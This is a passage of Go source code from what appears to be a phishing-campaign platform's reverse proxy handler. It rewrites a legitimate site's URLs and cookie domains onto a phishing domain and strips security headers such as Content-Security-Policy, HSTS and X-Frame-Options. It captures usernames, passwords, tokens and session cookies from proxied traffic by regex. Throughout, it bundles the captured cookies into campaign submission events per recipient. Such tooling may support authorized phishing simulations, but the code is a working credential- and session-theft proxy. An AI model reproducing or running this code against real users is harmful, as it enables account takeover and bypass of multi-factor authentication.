
	return resp
}

func (m *ProxyHandler) processCookiesForPhishingDomainWithContext(resp *http.Response, reqCtx *RequestContext) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	tempConfig := map[string]service.ProxyServiceDomainConfig{
		reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
	}

	resp.Header.Del("Set-Cookie")
	for _, ck := range cookies {
		m.adjustCookieSettings(ck, reqCtx.Session, resp)
		m.rewriteCookieDomain(ck, tempConfig, resp)
		resp.Header.Add("Set-Cookie", ck.String())
	}
}

func (m *ProxyHandler) createMinimalConfig(phishDomain, targetDomain string) map[string]service.ProxyServiceDomainConfig {
	config := make(map[string]service.ProxyServiceDomainConfig)
	var fullConfigYAML *service.ProxyServiceConfigYAML

	dbDomain := &database.Domain{}
	if err := m.DomainRepository.DB.Where("name = ?", phishDomain).First(dbDomain).Error; err == nil {
		if dbDomain.ProxyID != nil {
			dbProxy := &database.Proxy{}
			if err := m.ProxyRepository.DB.Where("id = ?", *dbDomain.ProxyID).First(dbProxy).Error; err == nil {
				if configYAML, err := m.parseProxyConfig(dbProxy.ProxyConfig); err == nil {
					fullConfigYAML = configYAML
					for host, hostConfig := range fullConfigYAML.Hosts {
						if hostConfig != nil {
							config[host] = *hostConfig
						}
					}
				}
			}
		}
	}

	// fallback to basic mapping
	if len(config) == 0 {
		config[targetDomain] = service.ProxyServiceDomainConfig{To: phishDomain}
	}

	// add global rules to all host configurations
	if fullConfigYAML != nil && fullConfigYAML.Global != nil {
		for originalHost := range config {
			hostConfig := config[originalHost]
			// append global capture rules
			hostConfig.Capture = append(hostConfig.Capture, fullConfigYAML.Global.Capture...)
			// append global rewrite rules
			hostConfig.Rewrite = append(hostConfig.Rewrite, fullConfigYAML.Global.Rewrite...)
			config[originalHost] = hostConfig
		}
	}

	return config
}

func (m *ProxyHandler) removeSecurityHeaders(resp *http.Response) {
	headers := []string{
		"Content-Security-Policy",
		"Content-Security-Policy-Report-Only",
		"Strict-Transport-Security",
		"X-XSS-Protection",
		"X-Content-Type-Options",
		"X-Frame-Options",
	}
	for _, header := range headers {
		resp.Header.Del(header)
	}
}

func (m *ProxyHandler) rewriteLocationHeaderWithoutSession(resp *http.Response, config map[string]service.ProxyServiceDomainConfig) {
	location := resp.Header.Get("Location")
	if location == "" {
		return
	}

	if rURL, err := url.Parse(location); err == nil {
		if phishHost := m.replaceHostWithPhished(rURL.Host, config); phishHost != "" {
			rURL.Host = phishHost
			resp.Header.Set("Location", rURL.String())
		}
	}
}

func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Response, reqCtx *RequestContext, config map[string]service.ProxyServiceDomainConfig) {
	contentType := resp.Header.Get("Content-Type")
	if !m.shouldProcessContent(contentType) {
		return
	}

	defer resp.Body.Close()
	body, wasCompressed, err := m.readAndDecompressBody(resp)
	if err != nil {
		m.logger.Errorw("failed to read and decompress response body", "error", err)
		return
	}

	body = m.patchUrls(config, body, CONVERT_TO_PHISHING_URLS)
	body = m.applyURLPathRewritesWithoutSession(body, reqCtx)
	body = m.applyCustomReplacementsWithoutSession(body, config, reqCtx.TargetDomain)

	m.updateResponseBody(resp, body, wasCompressed)
	if m.shouldCacheControlContent(contentType) {
		resp.Header.Set("Cache-Control", "no-cache, no-store")
	}
}

func (m *ProxyHandler) shouldCacheControlContent(contentType string) bool {
	return strings.Contains(contentType, "text/html") ||
		strings.Contains(contentType, "javascript") ||
		strings.Contains(contentType, "application/json")
}

func (m *ProxyHandler) patchUrls(config map[string]service.ProxyServiceDomainConfig, body []byte, convertType int) []byte {
	hostMap, hosts := m.buildHostMapping(config, convertType)

	// sort hosts by length (longest first) to avoid partial replacements
	sort.Slice(hosts, func(i, j int) bool {
		return len(hosts[i]) > len(hosts[j])
	})

	// first pass: urls with schemes
	body = m.replaceURLsWithScheme(body, hosts, hostMap)

	// second pass: urls without schemes
	body = m.replaceURLsWithoutScheme(body, hosts, hostMap)

	return body
}

func (m *ProxyHandler) buildHostMapping(config map[string]service.ProxyServiceDomainConfig, convertType int) (map[string]string, []string) {
	hostMap := make(map[string]string)
	var hosts []string

	for originalHost, hostConfig := range config {
		if hostConfig.To == "" {
			continue
		}

		var from, to string
		if convertType == CONVERT_TO_ORIGINAL_URLS {
			from = hostConfig.To
			to = originalHost
		} else {
			from = originalHost
			to = hostConfig.To
		}

		hostMap[strings.ToLower(from)] = to
		hosts = append(hosts, strings.ToLower(from))
	}

	return hostMap, hosts
}

func (m *ProxyHandler) replaceURLsWithScheme(body []byte, hosts []string, hostMap map[string]string) []byte {
	return []byte(MATCH_URL_REGEXP.ReplaceAllStringFunc(string(body), func(sURL string) string {
		u, err := url.Parse(sURL)
		if err != nil {
			return sURL
		}

		for _, h := range hosts {
			if strings.ToLower(u.Host) == h {
				return strings.Replace(sURL, u.Host, hostMap[h], 1)
			}
		}
		return sURL
	}))
}

func (m *ProxyHandler) replaceURLsWithoutScheme(body []byte, hosts []string, hostMap map[string]string) []byte {
	return []byte(MATCH_URL_REGEXP_WITHOUT_SCHEME.ReplaceAllStringFunc(string(body), func(sURL string) string {
		for _, h := range hosts {
			if strings.Contains(sURL, h) && !strings.Contains(sURL, hostMap[h]) {
				return strings.Replace(sURL, h, hostMap[h], 1)
			}
		}
		return sURL
	}))
}

func (m *ProxyHandler) replaceHostWithOriginal(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
	for originalHost, hostConfig := range config {
		if strings.EqualFold(hostConfig.To, hostname) {
			return originalHost
		}
	}
	return ""
}

func (m *ProxyHandler) replaceHostWithPhished(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
	// first pass: look for exact matches (case-insensitive)
	for originalHost, hostConfig := range config {
		if strings.EqualFold(originalHost, hostname) {
			return hostConfig.To
		}
	}

	// second pass: look for subdomain matches
	for originalHost, hostConfig := range config {
		if strings.HasSuffix(strings.ToLower(hostname), "."+strings.ToLower(originalHost)) {
			// use case-insensitive trimming to handle mixed case properly
			lowerHostname := strings.ToLower(hostname)
			lowerOriginal := strings.ToLower(originalHost)
			subdomain := strings.TrimSuffix(lowerHostname, "."+lowerOriginal)

			if subdomain != "" {
				return subdomain + "." + hostConfig.To
			}
			return hostConfig.To
		}
	}
	return ""
}

func (m *ProxyHandler) createNewSession(
	req *http.Request,
	reqCtx *RequestContext,
) (*ProxySession, error) {
	// use cached campaign data from request context
	campaign := reqCtx.Campaign
	recipientID := reqCtx.RecipientID
	campaignID := reqCtx.CampaignID
	campaignRecipientID := reqCtx.CampaignRecipientID

	if campaign == nil || recipientID == nil || campaignID == nil || campaignRecipientID == nil {
		return nil, fmt.Errorf("missing required campaign data in request context")
	}

	// create session configuration
	sessionConfig := m.buildSessionConfig(reqCtx.TargetDomain, reqCtx.Domain.Name, reqCtx.ProxyConfig)

	// create session
	session := &ProxySession{
		ID:                  uuid.New().String(),
		CampaignRecipientID: campaignRecipientID,
		CampaignID:          campaignID,
		RecipientID:         recipientID,
		Campaign:            campaign,
		Domain:              reqCtx.Domain,
		TargetDomain:        reqCtx.TargetDomain,

		CreatedAt: time.Now(),
	}

	// initialize session data
	m.initializeSession(session, sessionConfig)

	// store session
	m.sessions.Store(session.ID, session)
	if campaignRecipientID != nil {
		m.campaignRecipientSessions.Store(campaignRecipientID.String(), session.ID)
	}

	return session, nil
}

func (m *ProxyHandler) getCampaignInfo(ctx context.Context, campaignRecipientID *uuid.UUID) (*model.Campaign, *uuid.UUID, *uuid.UUID, error) {
	cRecipient, err := m.CampaignRecipientRepository.GetByID(ctx, campaignRecipientID, &repository.CampaignRecipientOption{})
	if err != nil {
		return nil, nil, nil, fmt.Errorf("invalid campaign recipient ID %s: %w", campaignRecipientID.String(), err)
	}

	recipientID, err := cRecipient.RecipientID.Get()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("campaign recipient %s has no recipient ID: %w", campaignRecipientID.String(), err)
	}

	campaignID, err := cRecipient.CampaignID.Get()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("campaign recipient %s has no campaign ID: %w", campaignRecipientID.String(), err)
	}

	campaign, err := m.CampaignRepository.GetByID(ctx, &campaignID, &repository.CampaignOption{
		WithCampaignTemplate: true,
	})
	if err != nil {
		return nil, nil, nil, fmt.Errorf("failed to get campaign %s: %w", campaignID.String(), err)
	}

	return campaign, &recipientID, &campaignID, nil
}

func (m *ProxyHandler) buildSessionConfig(targetDomain, phishDomain string, proxyConfig *service.ProxyServiceConfigYAML) map[string]service.ProxyServiceDomainConfig {
	sessionConfig := map[string]service.ProxyServiceDomainConfig{
		targetDomain: {To: phishDomain},
	}

	// Copy domain-specific proxy config
	for originalHost, hostConfig := range proxyConfig.Hosts {
		if hostConfig != nil {
			sessionConfig[originalHost] = *hostConfig
		}
	}

	// add global rules only to the target domain configuration
	if proxyConfig.Global != nil && sessionConfig[targetDomain].To != "" {
		hostConfig := sessionConfig[targetDomain]
		// append global capture rules
		hostConfig.Capture = append(hostConfig.Capture, proxyConfig.Global.Capture...)
		// append global rewrite rules
		hostConfig.Rewrite = append(hostConfig.Rewrite, proxyConfig.Global.Rewrite...)
		sessionConfig[targetDomain] = hostConfig
	}

	return sessionConfig
}

func (m *ProxyHandler) initializeSession(session *ProxySession, sessionConfig map[string]service.ProxyServiceDomainConfig) {
	// store configuration in sync.map
	for host, config := range sessionConfig {
		session.Config.Store(host, config)
	}

	// initialize atomic values
	session.IsComplete.Store(false)
	session.CookieBundleSubmitted.Store(false)
	session.NextPageType.Store("")

	// initialize required captures
	m.initializeRequiredCaptures(session)
}

func (m *ProxyHandler) findSessionByCampaignRecipient(campaignRecipientID *uuid.UUID) string {
	if campaignRecipientID == nil {
		return ""
	}

	sessionIDVal, exists := m.campaignRecipientSessions.Load(campaignRecipientID.String())
	if !exists {
		return ""
	}

	sessionID := sessionIDVal.(string)
	if sessionVal, sessionExists := m.sessions.Load(sessionID); sessionExists {
		if _, ok := sessionVal.(*ProxySession); ok {
			return sessionID
		}
	}

	// cleanup orphaned mapping
	m.campaignRecipientSessions.Delete(campaignRecipientID.String())
	return ""
}

func (m *ProxyHandler) initializeRequiredCaptures(session *ProxySession) {
	session.Config.Range(func(key, value interface{}) bool {
		hostConfig := value.(service.ProxyServiceDomainConfig)
		if hostConfig.Capture != nil {
			for _, capture := range hostConfig.Capture {
				if capture.Required == nil || *capture.Required {
					session.RequiredCaptures.Store(capture.Name, false)
				}
			}
		}
		return true
	})
}

func (m *ProxyHandler) onRequestBody(req *http.Request, session *ProxySession) {
	if req.Body == nil {
		return
	}

	hostConfig, exists := m.getHostConfig(session, req.Host)
	if !exists {
		return
	}
	body := m.readRequestBody(req)

	if hostConfig.Capture != nil {
		for _, capture := range hostConfig.Capture {
			if m.shouldApplyCaptureRule(capture, "request_body", req) {
				m.captureFromText(string(body), capture, session, req, "request_body")
			}
		}
	}

	m.applyRequestBodyReplacements(req, session)
}

func (m *ProxyHandler) onRequestHeader(req *http.Request, session *ProxySession) {
	hostConfig, exists := m.getHostConfig(session, req.Host)
	if !exists {
		return
	}
	var buf bytes.Buffer
	req.Header.Write(&buf)

	if hostConfig.Capture != nil {
		for _, capture := range hostConfig.Capture {
			if m.shouldApplyCaptureRule(capture, "request_header", req) {
				m.captureFromText(buf.String(), capture, session, req, "request_header")
			}
		}
	}

	// request header rewrite logic (mirrors applyRequestHeaderReplacements)
	if hostConfig.Rewrite != nil {
		for _, replacement := range hostConfig.Rewrite {
			if replacement.From == "" || replacement.From == "request_header" || replacement.From == "any" {
				engine := replacement.Engine
				if engine == "" {
					engine = "regex"
				}
				if engine == "regex" {
					re, err := regexp.Compile(replacement.Find)
					if err != nil {
						m.logger.Errorw("invalid request_header replacement regex", "error", err, "sessionID", session.ID)
						continue
					}
					for headerName, values := range req.Header {
						newValues := make([]string, 0, len(values))
						for _, val := range values {
							fullHeader := headerName + ": " + val
							replaced := re.ReplaceAllString(fullHeader, replacement.Replace)
							if strings.HasPrefix(replaced, headerName+": ") {
								newVal := replaced[len(headerName)+2:]
								newValues = append(newValues, newVal)
							} else if replaced != fullHeader {
								m.logger.Warnw("header name changed by replacement, skipping", "original", headerName, "sessionID", session.ID)
								newValues = append(newValues, val)
							} else {
								newValues = append(newValues, val)
							}
						}
						req.Header[headerName] = newValues
					}
				}
			}
		}
	}
}

func (m *ProxyHandler) onResponseBody(resp *http.Response, body []byte, session *ProxySession) {
	originalHost := resp.Request.Host
	if originalHost == "" {
		originalHost = session.TargetDomain
	}

	hostConfig, exists := m.getHostConfig(session, originalHost)
	if !exists {
		return
	}

	if hostConfig.Capture != nil {
		for _, capture := range hostConfig.Capture {
			if m.shouldProcessResponseBodyCapture(capture, resp.Request) {
				if capture.Find == "" {
					m.handlePathBasedCapture(capture, session, resp)
				} else {
					m.captureFromText(string(body), capture, session, resp.Request, "response_body")
				}
			}
		}
	}
}

func (m *ProxyHandler) onResponseCookies(resp *http.Response, session *ProxySession) {
	hostConfig, exists := m.getHostConfig(session, resp.Request.Host)
	if !exists {
		return
	}
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	capturedCookies := make(map[string]map[string]string)

	if hostConfig.Capture != nil {
		for _, capture := range hostConfig.Capture {
			if capture.From == "cookie" && m.matchesPath(capture, resp.Request) {
				if cookieData := m.extractCookieData(capture, cookies, resp); cookieData != nil {
					capturedCookies[capture.Name] = cookieData
					// always overwrite cookie data to ensure we have the latest cookies
					// this is important for scenarios like failed login -> successful login
					session.CapturedData.Store(capture.Name, cookieData)
					m.checkCaptureCompletion(session, capture.Name)
					// reset cookie bundle submitted flag since we have new cookie data
					// this allows resubmission with the latest cookies after all captures complete
					session.CookieBundleSubmitted.Store(false)
				}
			}
		}
	}

	if len(capturedCookies) > 0 {
		m.handleCampaignFlowProgression(session, resp.Request)
	}

	m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
}

func (m *ProxyHandler) onResponseHeader(resp *http.Response, session *ProxySession) {
	hostConfig, exists := m.getHostConfig(session, resp.Request.Host)
	if !exists {
		return
	}
	var buf bytes.Buffer
	resp.Header.Write(&buf)

	if hostConfig.Capture != nil {
		for _, capture := range hostConfig.Capture {
			if m.shouldApplyCaptureRule(capture, "response_header", resp.Request) {
				m.captureFromText(buf.String(), capture, session, resp.Request, "response_header")
				m.handleImmediateCampaignRedirect(session, resp, resp.Request, "response_header")
			}
		}
	}
}

func (m *ProxyHandler) shouldApplyCaptureRule(capture service.ProxyServiceCaptureRule, captureType string, req *http.Request) bool {
	// check capture source
	if capture.From != "" && capture.From != captureType && capture.From != "any" {
		return false
	}

	// check method
	if capture.Method != "" && capture.Method != req.Method {
		return false
	}

	// check path
	return m.matchesPath(capture, req)
}

func (m *ProxyHandler) shouldProcessResponseBodyCapture(capture service.ProxyServiceCaptureRule, req *http.Request) bool {
	// handle path-based captures
	if capture.Path != "" && (capture.Method == "" || capture.Method == req.Method) {
		return m.matchesPath(capture, req)
	}

	// handle regular response body captures
	return m.shouldApplyCaptureRule(capture, "response_body", req)
}

func (m *ProxyHandler) matchesPath(capture service.ProxyServiceCaptureRule, req *http.Request) bool {
	if capture.PathRe == nil {
		return true
	}
	return capture.PathRe.MatchString(req.URL.Path)
}

func (m *ProxyHandler) handlePathBasedCapture(capture service.ProxyServiceCaptureRule, session *ProxySession, resp *http.Response) {
	// only mark as complete if path AND method match exactly
	methodMatches := capture.Method == "" || capture.Method == resp.Request.Method
	pathMatches := m.matchesPath(capture, resp.Request)

	if methodMatches && pathMatches {
		// store captured data before marking complete
		capturedData := map[string]string{
			"navigation_path": resp.Request.URL.Path,
			"capture_type":    "navigation",
		}
		session.CapturedData.Store(capture.Name, capturedData)
		m.checkCaptureCompletion(session, capture.Name)

		if session.CampaignRecipientID != nil && session.CampaignID != nil {
			m.createCampaignSubmitEvent(session, capturedData, resp.Request)
		}

		// check if cookie bundle should be submitted now that this capture is complete
		m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
	}

	m.handleImmediateCampaignRedirect(session, resp, resp.Request, "path_navigation")
}

func (m *ProxyHandler) extractCookieData(capture service.ProxyServiceCaptureRule, cookies []*http.Cookie, resp *http.Response) map[string]string {
	cookieName := capture.Find
	if cookieName == "" {
		return nil
	}

	for _, cookie := range cookies {
		if cookie.Name == cookieName {
			return m.buildCookieData(cookie, resp)
		}
	}
	return nil
}

func (m *ProxyHandler) buildCookieData(cookie *http.Cookie, resp *http.Response) map[string]string {
	cookieDomain := cookie.Domain
	if cookieDomain == "" {
		cookieDomain = resp.Request.Host
	}

	isSecure := cookie.Secure
	if resp.Request.URL.Scheme == "https" && !isSecure {
		isSecure = true
	}

	cookieData := map[string]string{
		"name":         cookie.Name,
		"value":        cookie.Value,
		"domain":       cookieDomain,
		"path":         cookie.Path,
		"capture_time": time.Now().Format(time.RFC3339),
	}

	if isSecure {
		cookieData["secure"] = "true"
	}
	if cookie.HttpOnly {
		cookieData["httpOnly"] = "true"
	}
	if cookie.SameSite != http.SameSiteDefaultMode {
		cookieData["sameSite"] = m.sameSiteToString(cookie.SameSite)
	}
	if !cookie.Expires.IsZero() && cookie.Expires.Year() > 1 {
		cookieData["expires"] = cookie.Expires.Format(time.RFC3339)
	}
	if cookie.MaxAge > 0 {
		cookieData["maxAge"] = fmt.Sprintf("%d", cookie.MaxAge)
	}
	if resp.Request.Host != cookieDomain {
		cookieData["original_host"] = resp.Request.Host
	}

	return cookieData
}

func (m *ProxyHandler) readRequestBody(req *http.Request) []byte {
	body, err := io.ReadAll(req.Body)
	if err != nil {
		m.logger.Errorw("failed to read request body", "error", err)
		return nil
	}
	req.Body.Close()
	req.Body = io.NopCloser(bytes.NewBuffer(body))
	return body
}

func (m *ProxyHandler) captureFromText(text string, capture service.ProxyServiceCaptureRule, session *ProxySession, req *http.Request, captureContext string) {
	if capture.Find == "" {
		return
	}

	re, err := regexp.Compile(capture.Find)
	if err != nil {
		m.logger.Errorw("invalid capture regex", "error", err, "pattern", capture.Find)
		return
	}

	matches := re.FindStringSubmatch(text)
	if len(matches) == 0 {
		return
	}

	capturedData := m.buildCapturedData(matches, capture, session, req, captureContext)
	session.CapturedData.Store(capture.Name, capturedData)
	m.checkCaptureCompletion(session, capture.Name)

	// submit non-cookie captures immediately
	if capture.From != "cookie" && session.CampaignRecipientID != nil && session.CampaignID != nil {
		m.createCampaignSubmitEvent(session, capturedData, req)
	}

	// check if we should submit cookie bundle (only when all captures complete)
	m.checkAndSubmitCookieBundleWhenComplete(session, req)
	m.handleCampaignFlowProgression(session, req)
}

func (m *ProxyHandler) buildCapturedData(matches []string, capture service.ProxyServiceCaptureRule, session *ProxySession, req *http.Request, captureContext string) map[string]string {
	capturedData := make(map[string]string)

	// add capture name to the captured data
	capturedData["capture_name"] = capture.Name

	if len(matches) > 1 {
		for i := 1; i < len(matches); i++ {
			capturedData[fmt.Sprintf("group_%d", i)] = matches[i]
		}
		m.formatCapturedData(capturedData, capture, matches, session, req, captureContext)
	} else {
		capturedData["matched"] = matches[0]
	}

	return capturedData
}

func (m *ProxyHandler) formatCapturedData(capturedData map[string]string, capture service.ProxyServiceCaptureRule, matches []string, session *ProxySession, req *http.Request, captureContext string) {
	captureName := strings.ToLower(capture.Name)

	switch {
	case strings.Contains(captureName, "credential") || strings.Contains(captureName, "login"):
		if len(matches) >= 3 {
			capturedData["username"] = matches[1]
			capturedData["password"] = matches[2]
		}
	case capture.From == "cookie":
		if len(matches) >= 2 {
			capturedData["cookie_value"] = matches[1]
			domain := session.TargetDomain
			if captureContext != "response_header" && captureContext != "response_body" {
				domain = req.Host
			}
			if domain != "" {
				capturedData["cookie_domain"] = domain
			}
		}
	case strings.Contains(captureName, "token"):
		if len(matches) >= 2 {
			capturedData["token_value"] = matches[1]
			capturedData["token_type"] = capture.Name
		}
	}
}

func (m *ProxyHandler) checkCaptureCompletion(session *ProxySession, captureName string) {
	if _, exists := session.RequiredCaptures.Load(captureName); exists {
		// only mark as complete if we actually have captured data for this capture
		if _, hasData := session.CapturedData.Load(captureName); hasData {
			session.RequiredCaptures.Store(captureName, true)

			// check if all required captures are complete
			allComplete := true
			session.RequiredCaptures.Range(func(key, value interface{}) bool {
				if !value.(bool) {
					allComplete = false
					return false
				}
				return true
			})
			session.IsComplete.Store(allComplete)
		}
	}
}

func (m *ProxyHandler) checkAndSubmitCookieBundleWhenComplete(session *ProxySession, req *http.Request) {
	if session.CampaignRecipientID == nil || session.CampaignID == nil {
		return
	}

	if session.CookieBundleSubmitted.Load() {
		return
	}

	// only submit cookie bundle when ALL captures (including non-cookie ones) are complete
	// this ensures we capture the final state after all authentication attempts
	if !session.IsComplete.Load() {
		return
	}

	// submit cookie bundle if there are cookie captures
	cookieCaptures, requiredCookieCaptures := m.collectCookieCaptures(session)
	if m.areAllCookieCapturesComplete(requiredCookieCaptures) && len(cookieCaptures) > 0 {
		bundledData := m.createCookieBundle(cookieCaptures, session)
		m.createCampaignSubmitEvent(session, bundledData, req)
		session.CookieBundleSubmitted.Store(true)
	}
}

func (m *ProxyHandler) collectCookieCaptures(session *ProxySession) (map[string]map[string]string, map[string]bool) {
	cookieCaptures := make(map[string]map[string]string)
	requiredCookieCaptures := make(map[string]bool)

	session.RequiredCaptures.Range(func(requiredCaptureKey, requiredCaptureValue interface{}) bool {
		requiredCaptureName := requiredCaptureKey.(string)
		isComplete := requiredCaptureValue.(bool)

		session.Config.Range(func(hostKey, hostValue interface{}) bool {
			hostConfig := hostValue.(service.ProxyServiceDomainConfig)
			if hostConfig.Capture != nil {
				for _, capture := range hostConfig.Capture {
					if capture.Name == requiredCaptureName && capture.From == "cookie" {
						requiredCookieCaptures[requiredCaptureName] = isComplete
						if capturedDataInterface, exists := session.CapturedData.Load(requiredCaptureName); exists {
							cookieCaptures[requiredCaptureName] = capturedDataInterface.(map[string]string)
						}
						return false
					}
				}
			}
			return true
		})
		return true
	})

	return cookieCaptures, requiredCookieCaptures
}

func (m *ProxyHandler) areAllCookieCapturesComplete(requiredCookieCaptures map[string]bool) bool {
	if len(requiredCookieCaptures) == 0 {
		return false
	}

	for _, isComplete := range requiredCookieCaptures {
		if !isComplete {
			return false
		}
	}
	return true
}

func (m *ProxyHandler) createCookieBundle(cookieCaptures map[string]map[string]string, session *ProxySession) map[string]interface{} {
	bundledData := map[string]interface{}{
		"capture_type":     "cookie",
		"cookie_count":     len(cookieCaptures),
		"bundle_time":      time.Now().Format(time.RFC3339),
		"target_domain":    session.TargetDomain,
		"session_complete": true,
		"cookies":          make(map[string]interface{}),
	}

	cookies := bundledData["cookies"].(map[string]interface{})
	for captureName, cookieData := range cookieCaptures {
		cookies[captureName] = cookieData
	}

	return bundledData
}

func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *ProxySession) {
	if req.Body == nil {
		return
	}

	body := m.readRequestBody(req)

	session.Config.Range(func(key, value interface{}) bool {
		hostConfig := value.(service.ProxyServiceDomainConfig)
		if hostConfig.Rewrite != nil {
			for _, replacement := range hostConfig.Rewrite {
				if replacement.From == "" || replacement.From == "request_body" || replacement.From == "any" {
					body = m.applyReplacement(body, replacement, session.ID)
				}
			}
		}
		return true
	})

	req.Body = io.NopCloser(bytes.NewBuffer(body))
}

func (m *ProxyHandler) applyCustomReplacements(body []byte, session *ProxySession) []byte {
	session.Config.Range(func(key, value interface{}) bool {
		hostConfig := value.(service.ProxyServiceDomainConfig)
		if hostConfig.Rewrite != nil {
			for _, replacement := range hostConfig.Rewrite {
				if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
					body = m.applyReplacement(body, replacement, session.ID)
				}
			}
		}
		return true
	})
	return body
}

// applyCustomReplacementsWithoutSession applies rewrite rules for requests without session context
func (m *ProxyHandler) applyCustomReplacementsWithoutSession(body []byte, config map[string]service.ProxyServiceDomainConfig, targetDomain string) []byte {
	// apply rewrite rules from all host configurations (matches session behavior)
	for _, hostConfig := range config {
		if hostConfig.Rewrite != nil {
			for _, replacement := range hostConfig.Rewrite {
				if replacement.From == "" || replacement.From == "response_body" || replacement.From == "any" {
					body = m.applyReplacement(body, replacement, "no-session")
				}
			}
		}
	}

	return body
}

func (m *ProxyHandler) applyReplacement(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string) []byte {
	// default to regex engine if not specified
	engine := replacement.Engine
	if engine == "" {
		engine = "regex"
	}

	switch engine {
	case "regex":
		return m.applyRegexReplacement(body, replacement, sessionID)
	case "dom":
		return m.applyDomReplacement(body, replacement, sessionID)
	default:
		m.logger.Errorw("unsupported replacement engine", "engine", engine, "sessionID", sessionID)
		return body
	}
}

// applyRegexReplacement applies regex-based replacement
func (m *ProxyHandler) applyRegexReplacement(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string) []byte {
	re, err := regexp.Compile(replacement.Find)
	if err != nil {
		m.logger.Errorw("invalid replacement regex", "error", err, "sessionID", sessionID)
		return body
	}

	oldContent := string(body)
	content := re.ReplaceAllString(oldContent, replacement.Replace)
	if content != oldContent {
		return []byte(content)
	}
	return body
}

// applyDomReplacement applies DOM-based replacement
func (m *ProxyHandler) applyDomReplacement(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string) []byte {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(string(body)))
	if err != nil {
		m.logger.Errorw("failed to parse html for dom manipulation", "error", err, "sessionID", sessionID)
		return body
	}

	// find elements using the selector
	selection := doc.Find(replacement.Find)
	if selection.Length() == 0 {
		// no elements found, return original body
		return body
	}

	// apply target filtering
	selection = m.applyTargetFilter(selection, replacement.Target)
	if selection.Length() == 0 {
		return body
	}

	switch replacement.Action {
	case "setText":
		selection.SetText(replacement.Replace)
	case "setHtml":
		selection.SetHtml(replacement.Replace)
	case "setAttr":
		// for setAttr, replace should be in format "attribute:value"
		parts := strings.SplitN(replacement.Replace, ":", 2)
		if len(parts) == 2 {
			selection.SetAttr(parts[0], parts[1])
		} else {
			m.logger.Errorw("invalid setAttr replace format, expected 'attribute:value'", "replace", replacement.Replace, "sessionID", sessionID)
			return body
		}
	case "removeAttr":
		selection.RemoveAttr(replacement.Replace)
	case "addClass":
		selection.AddClass(replacement.Replace)
	case "removeClass":
		selection.RemoveClass(replacement.Replace)
	case "remove":
		selection.Remove()
	default:
		m.logger.Errorw("unsupported dom action", "action", replacement.Action, "sessionID", sessionID)
		return body
	}

	// get the modified html
	html, err := doc.Html()
	if err != nil {
		m.logger.Errorw("failed to generate html from dom document", "error", err, "sessionID", sessionID)
		return body
	}

	return []byte(html)
}

// applyTargetFilter filters the selection based on target specification
func (m *ProxyHandler) applyTargetFilter(selection *goquery.Selection, target string) *goquery.Selection {
	if target == "" || target == "all" {
		return selection
	}

	length := selection.Length()
	if length == 0 {
		return selection
	}

	switch target {
	case "first":
		return selection.First()
	case "last":
		return selection.Last()
	default:
		// handle numeric patterns like "1,3,5" or "2-4"
		if matched, _ := regexp.MatchString(`^(\d+,)*\d+$`, target); matched {
			// comma-separated list like "1,3,5"
			indices := strings.Split(target, ",")
			var filteredSelection *goquery.Selection
			for _, indexStr := range indices {
				if index, err := strconv.Atoi(strings.TrimSpace(indexStr)); err == nil {
					// convert to 0-based index
					if index > 0 && index <= length {
						element := selection.Eq(index - 1)
						if filteredSelection == nil {
							filteredSelection = element
						} else {
							filteredSelection = filteredSelection.AddSelection(element)
						}
					}
				}
			}
			if filteredSelection != nil {
				return filteredSelection
			}
		} else if matched, _ := regexp.MatchString(`^\d+-\d+$`, target); matched {
			// range like "2-4"
			parts := strings.Split(target, "-")
			if len(parts) == 2 {
				start, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
				end, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
				if err1 == nil && err2 == nil && start > 0 && end >= start {
					var filteredSelection *goquery.Selection
					for i := start; i <= end && i <= length; i++ {
						element := selection.Eq(i - 1)
						if filteredSelection == nil {
							filteredSelection = element
						} else {
							filteredSelection = filteredSelection.AddSelection(element)
						}
					}
					if filteredSelection != nil {
						return filteredSelection
					}
				}
			}
		}
	}

	// fallback to all if target is invalid
	return selection
}

func (m *ProxyHandler) processCookiesForPhishingDomain(resp *http.Response, ps *ProxySession) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	phishDomain := ps.Domain.Name
	targetDomain, err := m.getTargetDomainForPhishingDomain(phishDomain)
	if err != nil {
		m.logger.Errorw("failed to get target domain for cookie processing", "error", err, "phishDomain", phishDomain)
		return
	}

	tempConfig := map[string]service.ProxyServiceDomainConfig{
		targetDomain: {To: phishDomain},
	}

	resp.Header.Del("Set-Cookie")
	for _, ck := range cookies {
		m.adjustCookieSettings(ck, nil, resp)
		m.rewriteCookieDomain(ck, tempConfig, resp)
		resp.Header.Add("Set-Cookie", ck.String())
	}
}

func (m *ProxyHandler) adjustCookieSettings(ck *http.Cookie, session *ProxySession, resp *http.Response) {
	if ck.Secure {
		ck.SameSite = http.SameSiteNoneMode
	} else if ck.SameSite == http.SameSiteDefaultMode {
		ck.SameSite = http.SameSiteLaxMode
	}

	// handle cookie expiration parsing
	if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
		if exptime, err := time.Parse(time.RFC850, ck.RawExpires); err == nil {
			ck.Expires = exptime
		} else if exptime, err := time.Parse(time.ANSIC, ck.RawExpires); err == nil {
			ck.Expires = exptime
		} else if exptime, err := time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires); err == nil {
			ck.Expires = exptime
		}
	}
}

func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]service.ProxyServiceDomainConfig, resp *http.Response) {
	cDomain := ck.Domain
	if cDomain == "" {
		cDomain = resp.Request.Host
	} else if cDomain[0] != '.' {
		cDomain = "." + cDomain
	}

